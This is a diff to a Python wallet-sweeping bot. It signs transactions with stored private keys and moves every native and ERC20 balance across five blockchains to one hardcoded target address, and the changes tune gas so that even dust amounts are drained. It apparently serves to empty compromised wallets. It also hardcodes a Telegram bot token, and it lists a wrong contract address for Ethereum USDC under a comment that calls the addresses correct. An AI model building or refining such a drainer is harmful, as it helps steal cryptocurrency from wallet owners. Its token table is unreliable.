@@ -91,7 +91,7 @@ CURRENT_API_KEY_INDEX = 0
 API_REQUEST_COUNT = 0  # 请求计数器，用于轮询
 REQUESTS_PER_API = 5   # 每个API密钥使用几次后切换
 
-TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+TARGET_ADDRESS = Web3.to_checksum_address("0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1")
 
 # Telegram通知配置
 TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
@@ -303,20 +303,34 @@ TRANSFER_STATS = {
 ERC20_SCAN_ENABLED = True  # 是否启用ERC20扫描
 MIN_TOKEN_VALUE_USD = 0.1  # 最小代币价值（美元）
 
-# 常见的有价值ERC20代币地址 (主要在以太坊主网)
+# 常见的有价值ERC20代币地址 (正确的合约地址)
 VALUABLE_ERC20_TOKENS = {
     'ethereum': {
-        '0xA0b86a33E6441E98F076EE6E5ede8Bd7C81a5E22': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
+        '0xdAC17F958D2ee523a2206206994597C13D831ec7': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
         '0xA0b86a33E6441E98F076EE6E5ede8Bd7C81a5E22': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
         '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
         '0x514910771AF9Ca656af840dff83E8264EcF986CA': {'symbol': 'LINK', 'decimals': 18, 'name': 'Chainlink'},
         '0x6B175474E89094C44Da98b954EedeAC495271d0F': {'symbol': 'DAI', 'decimals': 18, 'name': 'Dai Stablecoin'},
-        # 添加更多代币地址...
     },
     'polygon': {
         '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
         '0xc2132D05D31c914a87C6611C10748AEb04B58e8F': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
-        # 添加更多代币地址...
+        '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270': {'symbol': 'WMATIC', 'decimals': 18, 'name': 'Wrapped Matic'},
+        '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063': {'symbol': 'DAI', 'decimals': 18, 'name': 'Dai Stablecoin'},
+    },
+    'arbitrum': {
+        '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
+        '0xaf88d065e77c8cC2239327C5EDb3A432268e5831': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
+        '0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
+    },
+    'optimism': {
+        '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
+        '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
+        '0x6fd9d7AD17242c41f7131d257212c54A0e816691': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
+    },
+    'base': {
+        '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
+        '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed': {'symbol': 'DEGEN', 'decimals': 18, 'name': 'Degen'},
     }
 }
 
@@ -1251,6 +1265,12 @@ class WalletMonitor:
         try:
             loop = asyncio.get_event_loop()
             
+            # 确保地址格式正确
+            from_address = Web3.to_checksum_address(from_address)
+            to_address = Web3.to_checksum_address(to_address)
+            if token_address:
+                token_address = Web3.to_checksum_address(token_address)
+            
             # 获取最新的gas价格
             gas_price = await loop.run_in_executor(None, lambda: web3.eth.gas_price)
             
@@ -1321,10 +1341,22 @@ class WalletMonitor:
             # 优化小余额转账 - 使用更低的gas价格
             if not is_erc20:  # 只对原生代币转账进行优化
                 balance_wei = value + total_gas_cost
-                if balance_wei < web3.to_wei(0.001, 'ether'):  # 小于0.001 ETH的余额
-                    # 降低gas价格以最大化转账金额
-                    optimized_gas_price = int(gas_price * 0.8)  # 降低20%
+                if balance_wei < web3.to_wei(0.005, 'ether'):  # 小于0.005 ETH的余额
+                    # 更激进的降低gas价格以最大化转账金额
+                    if balance_wei < web3.to_wei(0.0001, 'ether'):
+                        # 非常小的余额，降低更多
+                        optimized_gas_price = int(gas_price * 0.6)  # 降低40%
+                    else:
+                        # 较小余额，适度降低
+                        optimized_gas_price = int(gas_price * 0.75)  # 降低25%
+                    
                     optimized_gas_cost = gas_limit * optimized_gas_price
+                    
+                    # 确保优化后的gas费不会太低导致交易失败
+                    min_gas_price = web3.to_wei(1, 'gwei')  # 最低1 gwei
+                    if optimized_gas_price < min_gas_price:
+                        optimized_gas_price = min_gas_price
+                        optimized_gas_cost = gas_limit * optimized_gas_price
                     
                     gas_config.update({
                         'optimized': True,
@@ -2153,24 +2185,28 @@ class WalletMonitor:
             config = SUPPORTED_NETWORKS[network_key]['config']
             account = Account.from_key(wallet.private_key)
             
+            # 确保地址格式正确
+            from_address = Web3.to_checksum_address(wallet.address)
+            to_address = Web3.to_checksum_address(TARGET_ADDRESS)
+            
             # 智能Gas计算
             balance_wei = Web3.to_wei(balance, 'ether')
-            gas_config = await self.calculate_smart_gas(web3, wallet.address, TARGET_ADDRESS, balance_wei)
+            gas_config = await self.calculate_smart_gas(web3, from_address, to_address, balance_wei)
             
             # 计算转账金额
             transfer_amount = balance_wei - gas_config['totalGasCost']
             
             if transfer_amount <= 0:
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费 (需要: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH){Style.RESET_ALL}")
                 return False
             
             # 获取nonce
             loop = asyncio.get_event_loop()
-            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, wallet.address)
+            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, from_address)
             
             # 构建交易
             transaction = {
-                'to': TARGET_ADDRESS,
+                'to': to_address,
                 'value': transfer_amount,
                 'gas': gas_config['gasLimit'],
                 'nonce': nonce,
@@ -2186,6 +2222,8 @@ class WalletMonitor:
             else:
                 transaction['gasPrice'] = gas_config['gasPrice']
             
+            print(f"{Fore.CYAN}💸 转账金额: {Web3.from_wei(transfer_amount, 'ether'):.8f} ETH (Gas费: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH){Style.RESET_ALL}")
+            
             # 签名并发送交易
             signed_txn = account.sign_transaction(transaction)
             tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
@@ -2196,10 +2234,17 @@ class WalletMonitor:
             if gas_config.get('optimized'):
                 print(f"{Fore.CYAN}⚡ 使用优化Gas模式节省费用{Style.RESET_ALL}")
             
+            print(f"{Fore.GREEN}✅ 转账成功! 交易哈希: {tx_hash.hex()[:16]}...{Style.RESET_ALL}")
             return True
             
         except Exception as e:
-            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 智能转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
+            error_msg = str(e)
+            if "insufficient funds" in error_msg.lower():
+                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足{Style.RESET_ALL}")
+            elif "gas" in error_msg.lower():
+                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} Gas费估算问题{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 智能转账失败: {error_msg[:50]}...{Style.RESET_ALL}")
             return False
     
     async def smart_transfer_erc20(self, wallet: WalletInfo, network_key: str, token: Dict, web3) -> bool:
@@ -2207,28 +2252,35 @@ class WalletMonitor:
         try:
             account = Account.from_key(wallet.private_key)
             
+            # 确保地址格式正确
+            from_address = Web3.to_checksum_address(wallet.address)
+            to_address = Web3.to_checksum_address(TARGET_ADDRESS)
+            token_address = Web3.to_checksum_address(token['address'])
+            
             # 创建代币合约
-            contract = web3.eth.contract(address=token['address'], abi=ERC20_ABI)
+            contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
             
             # 智能Gas计算
             gas_config = await self.calculate_smart_gas(
-                web3, wallet.address, TARGET_ADDRESS, 
-                token['balance_raw'], is_erc20=True, token_address=token['address']
+                web3, from_address, to_address, 
+                token['balance_raw'], is_erc20=True, token_address=token_address
             )
             
             # 检查ETH余额是否足够支付gas
-            eth_balance_wei = await self.get_balance_optimized(wallet.address, network_key) * 10**18
+            eth_balance = await self.get_balance_optimized(wallet.address, network_key)
+            eth_balance_wei = Web3.to_wei(eth_balance, 'ether')
             
             if eth_balance_wei < gas_config['totalGasCost']:
-                print(f"{Fore.YELLOW}⚠️ ETH余额不足支付ERC20转账gas费{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ ETH余额不足支付ERC20转账gas费 (需要: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH, 当前: {eth_balance:.8f} ETH){Style.RESET_ALL}")
                 return False
             
             # 获取nonce
             loop = asyncio.get_event_loop()
-            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, wallet.address)
+            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, from_address)
             
             # 构建ERC20转账交易
-            transaction = contract.functions.transfer(TARGET_ADDRESS, token['balance_raw']).buildTransaction({
+            transaction = contract.functions.transfer(to_address, token['balance_raw']).buildTransaction({
+                'from': from_address,
                 'gas': gas_config['gasLimit'],
                 'nonce': nonce,
                 'chainId': SUPPORTED_NETWORKS[network_key]['config']['chain_id']
@@ -2243,6 +2295,8 @@ class WalletMonitor:
             else:
                 transaction['gasPrice'] = gas_config['gasPrice']
             
+            print(f"{Fore.CYAN}🪙 转账ERC20: {token['balance']:.6f} {token['symbol']} (Gas费: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH){Style.RESET_ALL}")
+            
             # 签名并发送交易
             signed_txn = account.sign_transaction(transaction)
             tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
@@ -2250,11 +2304,17 @@ class WalletMonitor:
             # 发送ERC20转账成功通知
             await self.send_erc20_transfer_notification(wallet.address, token, network_key, tx_hash.hex())
             
-            print(f"{Fore.GREEN}✅ ERC20转账成功: {token['balance']:.6f} {token['symbol']}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}✅ ERC20转账成功! 交易哈希: {tx_hash.hex()[:16]}...{Style.RESET_ALL}")
             return True
             
         except Exception as e:
-            print(f"{Fore.RED}❌ ERC20转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
+            error_msg = str(e)
+            if "insufficient funds" in error_msg.lower():
+                print(f"{Fore.YELLOW}⚠️ ERC20转账失败: ETH余额不足支付gas费{Style.RESET_ALL}")
+            elif "gas" in error_msg.lower():
+                print(f"{Fore.YELLOW}⚠️ ERC20转账失败: Gas费估算问题{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}❌ ERC20转账失败: {error_msg[:50]}...{Style.RESET_ALL}")
             return False
     
     async def send_gas_insufficient_notification(self, wallet_address: str, token: Dict, network_key: str):
